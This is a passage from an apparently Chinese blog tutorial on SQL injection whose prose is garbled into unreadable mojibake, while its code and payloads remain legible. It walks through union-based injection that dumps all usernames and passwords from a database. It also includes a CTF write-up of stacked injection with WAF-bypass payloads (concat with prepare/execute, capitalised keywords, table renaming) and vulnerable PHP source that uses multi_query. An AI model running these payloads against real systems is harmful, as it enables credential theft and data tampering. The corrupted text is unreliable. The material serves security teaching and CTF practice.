ä¸ªå‚æ•°å†çœ‹çœ‹ï¼Œå¦‚æœä¸è¡Œå°±æ¥ç€æ¢ï¼ŒçŸ¥é“ä¸æŠ¥è¿™ä¸ªé”™è¯¯ä¸ºæ­¢ã€‚</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/10.png" alt="11"></p><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°ç»“æœå‡ºæ¥äº†ï¼Œé‚£ä¹ˆå‰é¢æ˜¯æœ‰ä¸‰åˆ—çš„ï¼Œå¹¶ä¸”è´¦å·åœ¨ç¬¬äºŒåˆ—ï¼Œå¯†ç åœ¨ç¬¬ä¸‰åˆ—ï¼Œç¬¬ä¸€åˆ—å¤§æ¦‚ç‡æ˜¯è¿™ä¸ª <code>id</code> äº†ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±æœç€è¿™å‡ ä¸ªå›æ˜¾çš„åœ°æ–¹å»æ”¹å‚æ•°ï¼Œæ¯”å¦‚æˆ‘æƒ³çŸ¥é“æ•°æ®åº“åï¼Œå°±ç”¨å‰é¢çš„æ–¹æ³•ã€‚ä½†æ˜¯è¿™é‡Œéœ€è¦çŸ¥é“ä¸€ç‚¹ï¼Œé‚£å°±æ˜¯å›æ˜¾çš„åœ°æ–¹è¿™é‡Œåªèƒ½å­˜åœ¨ä¸€æ¡è®°å½•ï¼Œå¦‚æœå­˜åœ¨å¤šæ¡è®°å½•å°†æŠ¥é”™ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘å¯ä»¥æŠŠ <code>2</code> æ›¿æ¢æˆ <code>select xxx from zzzx.yyy</code> ä½†æ˜¯å¿…é¡»ä¿è¯ç»“æœé›†åªèƒ½å«æœ‰ä¸€æ¡è®°å½•ä¸€ä¸ªå­—æ®µï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚ä¸€ä¸ªå­—æ®µæ²¡æœ‰é—®é¢˜ï¼Œä½†æ˜¯ä¸€æ¡è®°å½•çš„è¯ï¼Œä½ ä¼šæƒ³åˆ° <code>limit</code>ï¼Œå¯ä»¥ï¼Œä½†æ˜¯å¤ªæ…¢äº†ï¼Œå¦‚æœæ•°æ®è®°å½•å¾ˆå¤šä¸€æ¡ä¸€æ¡æ‰“è¦ç´¯æ­»äººï¼Œè¿™é‡Œæˆ‘ä»¬ç”¨åˆ°ä¹‹å‰è®²è¿‡çš„èšåˆå‡½æ•° <code>group_concat</code>ï¼Œèšåˆå‡½æ•°ä¼šæŠŠæ‰€æœ‰è®°å½•æ•´åˆæˆä¸€æ¡è®°å½•ï¼Œå¹¶ä¸”æˆ‘ä»¬è¿˜èƒ½ä¸€æ¬¡è¾“å‡ºå¤šæ¡è®°å½•çš„ä¿¡æ¯ï¼Œé‚£ç®€ç›´ä¸€ä¸¾å¤šå¾—äº†ã€‚</p><p>æˆ‘ä»¬å¼€å§‹æŠ¥æ•°æ®åº“åå§ <code>select schema_name from information_schema.schemata</code></p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/11.png" alt="12"></p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çˆ†å‡ºäº†å½“å‰æ•°æ®åº“åå’Œæ‰€æœ‰æ•°æ®åº“åï¼Œè¿™é‡Œéœ€è¦æ³¨æ„ï¼Œæˆ‘ä»¬åœ¨æ›¿æ¢ä¸ºè¯­å¥çš„æ—¶å€™ï¼Œè¯­å¥ä¸€å®šè¦åŠ ä¸Šæ‹¬å·ï¼Œä¸ç„¶å®ƒçš„ <code>sql</code> ä¼šåˆ†æå¤±è´¥ã€‚</p><p>ç„¶åæˆ‘ä»¬çˆ†ä¸€ä¸‹ <code>security</code> æ•°æ®åº“çš„ä¿¡æ¯ï¼Œå…ˆçˆ†è¡¨åï¼Œå…¶å®åªéœ€è¦æ›¿æ¢ä¸€ä¸‹å°±å¯ä»¥äº†ï¼š<code>select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;</code></p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/12.png" alt="13"></p><p>æˆ‘ä»¬ä¸»è¦æ”¶é›†ä¸€ä¸‹ç”¨æˆ·ä¿¡æ¯å§ï¼Œæ‰€ä»¥çœ‹çœ‹ <code>users</code> æ•°æ®è¡¨çš„å†…å®¹ï¼Œæˆ‘ä»¬å…ˆè·å–å­—æ®µåï¼Œä¸€æ ·ä¸€æ ·åœ°å¾€ä¸Šå¥—å°±å®Œäº‹äº†ï¼š<code>select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;</code></p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/13.png" alt="13"></p><p>ç„¶åæˆ‘ä»¬è¿™é‡Œæˆ‘ä»¬å°±çœ‹åˆ°äº†æ‰€æœ‰çš„å­—æ®µåï¼Œæˆ‘ä»¬è¿™é‡Œç‚¹åˆ°ä¸ºæ­¢ï¼ŒæŠŠæ‰€æœ‰ç”¨æˆ·åå’Œå¯†ç çˆ†å‡ºæ¥å°±ç»“æŸå§ã€‚</p><p><code>select group_concat(username) from security.users</code> å’Œ <code>select group_concat(password) from security.users</code></p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/14.png" alt="14"></p><p>å¥½ï¼Œåˆ°è¿™é‡Œæˆ‘ä»¬å°±æŠŠæ•°æ®åº“çš„ä¿¡æ¯æˆåŠŸè·å–åˆ°äº†ã€‚</p><h5 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h5><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è”åˆæŸ¥è¯¢æ³¨å…¥ååˆ†æ–¹ä¾¿ï¼Œå‡ æ­¥åˆ°ä½å¯ä»¥æŠŠæ•°æ®åº“å…¨éƒ¨æ³„éœ²å‡ºæ¥ï¼Œä½†æ˜¯åˆ©ç”¨æ¡ä»¶ä¸€èˆ¬æ¯”è¾ƒè‹›åˆ»ï¼Œéœ€è¦æœ‰å›æ˜¾ç‚¹æ‰èƒ½å®ç°ã€‚</p><h4 id="å †å æ³¨å…¥"><a href="#å †å æ³¨å…¥" class="headerlink" title="å †å æ³¨å…¥"></a>å †å æ³¨å…¥</h4><p>å †å æ³¨å…¥çš„åŸç†å°±æ˜¯ä½¿ç”¨å¼•å·éš”å¼€å‰ä¸€ä¸ªæŸ¥è¯¢è¯­å¥ï¼Œå†è‡ªå·±ä¹¦å†™å¦å¤–çš„ <code>sql</code> è¯­å¥ä»¥æ­¤è¾¾åˆ°ä»»æ„æ‰§è¡Œ <code>sql</code> è¯­å¥çš„ç›®çš„ã€‚ç”±äºç»“æœå¾ˆéš¾å›æ˜¾ï¼Œæˆ‘ä»¬ä¸€èˆ¬è¿™ä¸ªç”¨çš„ä¸å¤šï¼Œå› ä¸ºæˆ‘ä»¬ä¸»è¦è¿˜æ˜¯è·å–ä¿¡æ¯ä¸ºä¸»ï¼Œè€Œä¸æ˜¯è¦å»ä¿®æ”¹å®ƒçš„æ•°æ®åº“ã€‚</p><p>è¿™ä¸ªæ¼”ç¤ºæˆ‘ä»¬ç”¨ <code>buuctf</code> é‡Œé¢çš„ä¸€é“é¢˜å§ï¼Œæ˜¯æ¥è‡ª2019å¼ºç½‘æ¯çš„ä¸€é“é¢˜ç›®ã€‚</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/15.png" alt="15"></p><p>å…ˆä¸ç®¡å®ƒæ€ä¹ˆè¯´ï¼Œæœ‰æäº¤çª—å£å…ˆæ­£å¸¸æäº¤çœ‹çœ‹å®ƒåŸæœ¬çš„ä¸šåŠ¡é€»è¾‘ã€‚</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/16.png" alt="16"></p><p>çœ‹è¿™ä¸ªè¾“å‡ºæ ¼å¼ï¼Œåº”è¯¥ä¹Ÿæ˜¯ä»æ•°æ®åº“é‡ŒæŒ‰ç…§ä¸€ä¸ªåº”è¯¥æ˜¯ <code>id</code> å­—æ®µæŸ¥è¯¢ï¼ŒæŸ¥è¯¢ç»“æœä¸ºä¸¤ä¸ªå­—æ®µï¼Œç„¶åç”¨ <code>var_dump</code> è¾“å‡ºç¬¬ä¸€æ¡è®°å½•çš„ä¿¡æ¯ï¼Œç„¶åæŒ‰ç…§å›½é™…æƒ¯ä¾‹åŠ ä¸ªåˆ†å·çœ‹å®ƒæ˜¯å¦æŠ¥é”™ã€‚</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/17.png" alt="17"></p><p>æŠ¥é”™äº†è¯´æ˜æœ‰æ³¨å…¥ç‚¹ã€‚</p><p>æˆ‘ä»¬å½“ç„¶è¿˜æ˜¯å…ˆè¯•è¯•è”åˆæŸ¥è¯¢æ³¨å…¥ï¼Œç”¨ <code>1&#39; union select 1,2--+</code>ï¼Œç„¶åæˆ‘ä»¬çœ‹åˆ°å®ƒå›æ˜¾äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">&quot;/select|update|delete|drop|insert|where|\./i&quot;</span>,<span class="variable">$inject</span>);</span><br></pre></td></tr></table></figure><p>å®ƒè¿‡æ»¤äº†å¾ˆå¤šå…³é”®å­—å¯¼è‡´æˆ‘ä»¬æ²¡åŠæ³•ç›´æ¥ä½¿ç”¨è”åˆæŸ¥è¯¢æ³¨å…¥ï¼Œå¹¶ä¸”æ­£åˆ™åé¢çš„ <code>/i</code> è¡¨ç¤ºå¤§å°å†™å…¨åŒ¹é…ï¼Œé‚£çœ‹æ¥å®ƒæ˜¯ä¸æƒ³è®©ä½ ç”¨è”åˆæŸ¥è¯¢æ³¨å…¥ï¼Œæˆ‘ä»¬ä¸å¦¨å…ˆè¯•è¯•å †å æ³¨å…¥ã€‚æˆ‘ä»¬å¯ä»¥å…ˆå» <code>mysql</code> è¿æ¥é‡Œé¢è‡ªå·±è¯•è¯•å †å æ³¨å…¥ï¼Œæ¯”å¦‚æˆ‘å…ˆå®ç°ä¸€ä¸ªé€»è¾‘ï¼Œè¿™ä¸ªé€»è¾‘ä»…ä»…æ˜¯æŸ¥è¯¢æ¯ä¸ªæ•°æ®åº“çš„è¡¨ï¼Œé‚£ä¹ˆæ•°æ®åº“å‚æ•°å¯æ§ï¼Œæˆ‘ä»¬å°±æ˜¯è¿™ä¹ˆå†™ <code>sql</code>  è¯­å¥çš„ï¼š<code>select table_name from information_schema.tables where table_schema=&#39;$input_database&#39;;</code>ã€‚</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/18.png" alt="18"></p><p>å¯ä»¥çœ‹åˆ°éšä¾¿è¾“å…¥ä¸€ä¸ªæ•°æ®åº“å¯ä»¥å®ç°åŠŸèƒ½ï¼Œé‚£ä¹ˆæˆ‘ä»¬è®© <code>$input_database=1&#39;;show databases;--</code>ï¼Œç»è¿‡æ‹¼æ¥ä¹‹åå½¢æˆäº†ï¼š</p><p><code>select table_name from information_schema.tables where table_schema=&#39;1&#39;;show databases;--&#39;;</code>ã€‚å¯ä»¥çœ‹åˆ°æˆ‘ä»¬åœ¨å‚æ•°ä¸­è¾“å…¥äº†å…¶å®ƒçš„ <code>sql</code> è¯­å¥ã€‚é‚£æˆ‘ä»¬çœ‹çœ‹ç»“æœå¦‚ä½•å‘¢ï¼Ÿä¸å‡ºæ„å¤–åœ°æ‰§è¡Œäº†æˆ‘ä»¬è¾“å…¥çš„ <code>show databases</code> æŒ‡ä»¤ã€‚</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/19.png" alt="19"></p><p>æ‰€ä»¥ä½ ä¹Ÿå°±æ¸…æ¥šäº†å †å æ³¨å…¥æ˜¯æ€ä¹ˆä¸€å›äº‹ï¼Œæˆ‘ä»¬è¯•è¯•çœ‹ï¼Œä¸€èˆ¬é¢˜ç›®é‡Œé¢å †å æ³¨å…¥éƒ½æ²¡æœ‰å¾ˆå¥½çš„å›æ˜¾ï¼Œä½†æ˜¯è¿™é¢˜å®ƒæœ‰ï¼Œè‡³äºä¸ºä»€ä¹ˆèƒ½æœ‰æˆ‘ä»¬ç­‰ä¼šå¯ä»¥åˆ†æä¸€ä¸‹å®ƒé¢˜ç›®çš„æºç ã€‚</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/20.png" alt="20"></p><p>å†é€šè¿‡ <code>show tables</code> æˆ‘ä»¬å¯ä»¥å‘ç°æœ‰ä¸¤å¼ è¡¨ <code>1919810931114514</code> å’Œ <code>words</code>ã€‚ç„¶åæˆ‘ä»¬ä¸‹ä¸€æ­¥å¯ä»¥ç”¨ <code>show columns from table_name</code> çš„æ–¹å¼å»æ˜¾ç¤ºè¡¨ä¸­æ‰€æœ‰çš„å­—æ®µåã€‚å…ˆçœ‹çœ‹ <code>words</code> è¡¨ï¼Œå‘ç°æœ‰ <code>id</code> å’Œ <code>data</code> å­—æ®µï¼Œè¿™é‡Œå¤§èƒ†ç‚¹çŒœæµ‹ï¼Œæˆ‘ä»¬åº”è¯¥æ˜¯æ ¹æ® <code>id</code> å»æŸ¥è¯¢ <code>data</code>ã€‚å®ƒçš„ <code>sql</code> è¯­å¥å¤§æ¦‚æ˜¯ <code>select data from supersqli.words where id=&#39;$input_id&#39;</code>ã€‚</p><p>è¿™é‡Œä¸€ä¸ªçƒ«èŠå£«æ³¨æ„ä¸€ä¸‹å•Šï¼Œå°±æ˜¯å½“æ•°æ®åº“åæˆ–è¡¨åæˆ–åˆ—åå¯èƒ½å¼•èµ·æ­§ä¹‰çš„æ—¶å€™ï¼Œéœ€è¦ä½¿ç”¨åå¼•å·å°†å…¶åŒ…è£¹ã€‚æ¯”å¦‚ä½  <code>select 1,2,3</code> æˆ‘å¹¶ä¸çŸ¥é“ä½ æƒ³æ‰¾çš„æ˜¯ 1,2,3 ä¸‰ä¸ªæ•°å€¼è¿˜æ˜¯è¿™ 1,2,3 æ˜¯åˆ—åã€‚é‚£ä¹ˆä¸ºäº†æ¶ˆé™¤è¿™ä¸ªæ­§ä¹‰æˆ‘ä»¬åœ¨è¿™ä¸ªæ—¶å€™ä½¿ç”¨åå¼•å·ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select `1`,`2`,`3`</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°å†™æ³•å°±æ˜¯è¡¨ç¤º 1,2,3 ä»£è¡¨åˆ—åï¼Œåå¼•å·åœ¨é”®ç›˜ä¸Šæ•°å­— <code>1</code> çš„å·¦è¾¹ã€‚</p><p>è¿™é‡Œå› ä¸ºæ˜¯å…¨æ•°å­—ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨åå¼•å·æ‰èƒ½æ˜¾ç¤ºå‡ºå®ƒæ‰€æœ‰çš„åˆ—ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åªæœ‰ä¸€ä¸ª <code>flag</code> åˆ—ã€‚é‚£ <code>flag</code> åº”è¯¥æ˜¯åœ¨é‡Œé¢ï¼Œæˆ‘ä»¬éœ€è¦æŸ¥è¯¢å‡ºå®ƒï¼Œè¿™é‡Œå°±å¯ä»¥ç”¨åˆ°å †å æ³¨å…¥çš„å¦ä¸€ç§å§¿åŠ¿ï¼šé¢„ç¼–è¯‘ã€‚</p><p>æˆ‘ä»¬ä¹Ÿå…ˆæ¥çœ‹çœ‹é¢„ç¼–è¯‘çš„ä¸€èˆ¬ç”¨æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set @sql=&#x27;show databases&#x27;;</span><br><span class="line">prepare ext from @sql;</span><br><span class="line">execute ext;</span><br></pre></td></tr></table></figure><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/21.png" alt="21"></p><p>å¯ä»¥å‘ç°å®ƒæˆåŠŸæ‰§è¡Œäº† <code>show databases</code>ï¼Œä½ å¯èƒ½ä¼šè§‰å¾—ä¸€ä¸¾ä¸¤å¾—äº†ï¼Œä½†æ˜¯è¿™å¯¹äºæˆ‘ä»¬ç»•è¿‡ <code>WAF</code> è¿˜æ˜¯å¾ˆæœ‰å¸®åŠ©çš„ï¼Œå®ƒä¸è®©å‡ºç° <code>select</code> è¿™ä¸ªå•è¯çš„ä»»æ„å¤§å°å†™å½¢å¼ï¼Œæˆ‘ä»¬å°±ç”¨å‰é¢çš„å­—ç¬¦ä¸²æ‹¼æ¥å‡½æ•° <code>concat</code> å°±å¯ä»¥ä¸å‡ºç° <code>select</code> å•è¯ä½†æ˜¯èƒ½æ‰§è¡Œ <code>select</code> è¯­å¥ã€‚</p><p>æˆ‘ä»¬è¿˜æ˜¯åœ¨è¿™ä¸ª <code>cmd</code>  é‡Œé¢å»è¿è¡Œã€‚</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/22.png" alt="22"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬åˆ©ç”¨ <code>concat</code> å‡½æ•°å’Œé¢„ç¼–è¯‘çš„æ–¹å¼åœ¨å…¨è¯­å¥æ²¡æœ‰å‡ºç°è¿‡ <code>select</code> çš„æƒ…å†µä¸‹ä½¿ç”¨äº† <code>select</code> è¯­å¥æ‰èƒ½å¹²çš„äº‹ã€‚</p><p>å› ä¸ºåœ¨ <code>php</code> é‡Œé¢ï¼Œæ‰§è¡Œè¯­å¥çš„æ—¶å€™æ‰ä¼šäº§ç”Ÿä¸€ä¸ªè¿›ç¨‹å»æ‰§è¡Œ <code>sql</code> è¯­å¥ï¼Œè¯­å¥ç»“æŸè¿›ç¨‹ä¹Ÿå°±ç»“æŸï¼Œå¦‚æœæˆ‘å…ˆ <code>set @sql=&#39;xxx&#39;</code> é‚£ä¹ˆå†æ¬¡æŸ¥è¯¢ä¸ä¼šä¿å­˜è¿™ä¸ªå˜é‡çš„ç»“æœï¼Œè¿™é‡Œå°±éœ€è¦æŠŠå¤šæ¡è¯­å¥æ•´åˆæˆä¸€æ¡ï¼Œè¿™ä¹Ÿæ˜¯å †å æ³¨å…¥ç‰¹æœ‰çš„ä¸€ä¸ªä¼˜åŠ¿å§ã€‚</p><p>æˆ‘ä»¬çš„ <code>payload</code> å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;set @sql=concat(&#x27;se&#x27;,&#x27;lect flag from `1919810931114514`;&#x27;);prepare ext from @sql;execute ext;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ‰“è¿›å»çš„æ—¶å€™å‘ç° <code>WAF</code> è¿˜æœ‰ä¸€å±‚æ£€æµ‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strstr(<span class="variable">$inject</span>, <span class="string">&quot;set&quot;</span>) &amp;&amp; strstr(<span class="variable">$inject</span>, <span class="string">&quot;prepare&quot;</span>)</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå¾ˆå¥½ç»•è¿‡ï¼Œå› ä¸ºè¿™ä¸ªå‡½æ•°å®ƒåˆ¤æ–­å¤§å°å†™çš„ï¼Œæˆ‘ä»¬å¯¹è¿™ä¸¤ä¸ªå…³é”®å­—éšä¾¿ä¸€ä¸ªå­—ç¬¦å¤§å†™å³å¯ç»•è¿‡ï¼Œæˆ‘ä»¬æœ€åçš„ <code>payload</code> å°±æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;Set @sql=concat(&#x27;se&#x27;,&#x27;lect flag from `1919810931114514`;&#x27;);Prepare ext from @sql;execute ext;</span><br></pre></td></tr></table></figure><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/23.png" alt="23"></p><p>æˆåŠŸè·å¾— <code>flag</code>ã€‚</p><p>å †å æ³¨å…¥è¿˜æœ‰ä¸€ä¸ªå¾ˆå‰å®³çš„å§¿åŠ¿å°±æ˜¯ä¿®æ”¹æ•°æ®åº“ï¼Œä½†æ˜¯è¯·æ³¨æ„ä¸è¦åˆ åº“ï¼Œå› ä¸ºè¿™æ ·çš„è¯ä½ å¯èƒ½å°±æ‹¿ä¸åˆ° <code>flag</code>ã€‚å¦‚æœæ‹¿å®Œ <code>flag</code> å†æŠŠ <code>flag</code> åˆ äº†ï¼Œå¦‚æœç¯å¢ƒä½ ä¸“ç”¨ä½ éšä¾¿ç©ï¼Œå…¬ç”¨çš„è¯å°±å®¹æ˜“è¢«åˆ«äººå–·äº†ï¼Œä¸‡ä¸€ç¯å¢ƒä¸èƒ½é‡ç½®ï¼Œé‚£ä½ ä¸æ˜¯ç›´æ¥æ²¡äº†ã€‚</p><p>ç¬¬äºŒç§æ–¹å¼æ˜¯æŠŠè£… <code>flag</code> çš„è¡¨æ”¹æˆæœ¬æ¥çš„é€»è¾‘æŸ¥è¯¢çš„è¡¨ï¼Œä¹Ÿå°±æ˜¯ <code>words</code> è¡¨ã€‚æˆ‘ä»¬æŠŠé‚£ä¸ªè¡¨çš„åå­—æ”¹æˆ <code>words</code>ï¼Œç„¶åå®ƒå¯èƒ½æ˜¯æ ¹æ® <code>id</code> æŸ¥è¯¢çš„ï¼Œæˆ‘ä»¬å°±æŠŠ <code>flag</code> åˆ—æ”¹æˆ <code>id</code> ä¹Ÿè®¸å®ƒæ˜¯æ ¹æ® <code>words</code> æŸ¥è¯¢çš„ï¼Œæˆ‘ä»¬åˆ°æ—¶å€™æ”¹ä¸€ä¸‹å°±å¥½äº†ã€‚</p><p>å…ˆå†™å‡ºæˆ‘ä»¬è¿™å‡ æ­¥çš„ <code>sql</code>ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename table `words` to `111`;</span><br><span class="line">rename table `1919810931114514` to `words`;</span><br><span class="line">alter table `words` change `flag` `id` varchar(100);</span><br></pre></td></tr></table></figure><p>å¦‚æœæˆåŠŸçš„è¯æˆ‘ä»¬åªéœ€è¦ä¸€ä¸ªä¸‡èƒ½å¯†ç å³å¯æŸ¥å‡ºæ‰€æœ‰åŸ <code>flag</code> è¡¨çš„æ‰€æœ‰è®°å½•ã€‚</p><p>æˆ‘ä»¬çš„ <code>payload</code> å°±æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;rename table `words` to `111`;rename table `1919810931114514` to `words`;alter table `words` change `flag` `id` varchar(100);</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œä¹‹åæˆ‘ä»¬ä½¿ç”¨ <code>1&#39; or 1=1--+</code> å¾—åˆ° <code>flag</code>ã€‚</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/24.png" alt="24"></p><p>å †å æ³¨å…¥ä¸ºä»€ä¹ˆå¯ä»¥å®ç°ï¼Œä¸‹é¢å°±åˆ°äº†æˆ‘ä»¬çš„æºç ç¯èŠ‚äº†ï¼Œæ²¡æœ‰å®˜æ–¹çš„æºç ï¼Œåªæ˜¯ä»ç½‘ä¸Šå¯»æ‰¾åˆ°äº†å·®ä¸å¤šç±»ä¼¼çš„ï¼Œå¤ç°å‡ºæ¥ä¹ŸåŸºæœ¬ä¸€è‡´ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;easy_sql&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;å–æäºæŸæ¬¡çœŸå®ç¯å¢ƒæ¸—é€ï¼Œåªè¯´ä¸€å¥è¯ï¼šå¼€å‘å’Œå®‰å…¨ç¼ºä¸€ä¸å¯&lt;/h1&gt;</span><br><span class="line">&lt;!-- sqlmapæ˜¯æ²¡æœ‰çµé­‚çš„ --&gt;</span><br><span class="line">&lt;form method=&quot;get&quot;&gt;</span><br><span class="line">    å§¿åŠ¿: &lt;input type=&quot;text&quot; name=&quot;inject&quot; value=&quot;1&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">function waf1($inject) &#123;</span><br><span class="line">    preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject) &amp;&amp; die(&#x27;return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">function waf2($inject) &#123;</span><br><span class="line">    strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;) &amp;&amp; die(&#x27;strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;)&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;inject&#x27;])) &#123;</span><br><span class="line">    $id = $_GET[&#x27;inject&#x27;];</span><br><span class="line">    waf1($id);</span><br><span class="line">    waf2($id);</span><br><span class="line">    $mysqli = new mysqli(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;,&quot;supersqli&quot;);</span><br><span class="line">    //å¤šæ¡sqlè¯­å¥</span><br><span class="line">    $sql = &quot;select * from `words` where id = &#x27;$id&#x27;;&quot;;</span><br><span class="line">    $res = $mysqli-&gt;multi_query($sql);</span><br><span class="line">    if ($res)&#123;//ä½¿ç”¨multi_query()æ‰§è¡Œä¸€æ¡æˆ–å¤šæ¡sqlè¯­å¥</span><br><span class="line">      do&#123;</span><br><span class="line">        if ($rs = $mysqli-&gt;store_result())&#123;//store_result()æ–¹æ³•è·å–ç¬¬ä¸€æ¡sqlè¯­å¥æŸ¥è¯¢ç»“æœ</span><br><span class="line">          while ($row = $rs-&gt;fetch_row())&#123;</span><br><span class="line">            var_dump($row);</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">          &#125;</span><br><span class="line">          $rs-&gt;Close(); //å…³é—­ç»“æœé›†</span><br><span class="line">          if ($mysqli-&gt;more_results())&#123;  //åˆ¤æ–­æ˜¯å¦è¿˜æœ‰æ›´å¤šç»“æœé›†</span><br><span class="line">            echo &quot;&lt;hr&gt;&quot;;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;while($mysqli-&gt;next_result()); //next_result()æ–¹æ³•è·å–ä¸‹ä¸€ç»“æœé›†ï¼Œè¿”å›boolå€¼</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      echo &quot;error &quot;.$mysqli-&gt;errno.&quot; : &quot;.$mysqli-&gt;error;</span><br><span class="line">    &#125;</span><br><span class="line">    $mysqli-&gt;close();  //å…³é—­æ•°æ®åº“è¿æ¥</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸­é—´çš„æºç ç¯èŠ‚å¯ä»¥çœ‹åˆ°å®ƒåœ¨æ‰§è¡Œ <code>sql</code> è¯­å¥çš„æ—¶å€™ä½¿ç”¨äº† <code>multi_query</code> å‡½æ•°ï¼Œå¹¶ä¸”ä¼šè¾“å‡ºæ‰€æœ‰çš„ç»“æœé›†ã€‚æ‰€ä»¥è¿™é¢˜å¯ä»¥ç”¨å †å æ³¨å…¥çš„åŸå› å°±åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆè½»æ˜“åœ°è·å¾—å¤šæ¡è¯­å¥çš„å›æ˜¾ï¼Œè€Œåœ¨ä¸€èˆ¬æƒ…å†µä¸‹æ˜¯ä¸èƒ½çš„ï¼Œæ‰€ä»¥è¿™é¢˜å°±æ˜¯ä¸“é—¨è®©ä½ ç”¨å †å æ³¨å…¥çš„ã€‚</p><h5 id="æ€»ç»“-1"><a href="#æ€»ç»“-1" class="headerlink" 